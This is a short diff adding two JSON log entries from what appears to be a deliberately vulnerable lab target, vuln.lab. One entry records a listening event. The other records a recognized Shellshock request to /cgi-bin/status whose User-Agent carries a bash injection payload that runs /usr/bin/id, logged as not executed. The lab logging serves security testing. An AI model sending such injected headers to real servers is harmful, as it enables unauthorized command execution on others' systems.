@@ -1,0 +1,2 @@
+{"command_execution": false, "component": "vulnerable-target", "event": "listening", "host": "10.230.31.30", "port": 80, "timestamp": "2026-08-24T10:26:53.519174+00:00", "virtual_hosts": ["vuln.lab"]}
+{"client": ["172.22.0.1", 58997], "command_executed": false, "component": "vulnerable-target", "event": "shellshock_request", "headers": {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Host": "vuln.lab", "User-Agent": "() { :;}; echo; /usr/bin/id"}, "method": "GET", "path": "/cgi-bin/status", "recognized": true, "timestamp": "2026-08-24T10:27:22.229113+00:00"}
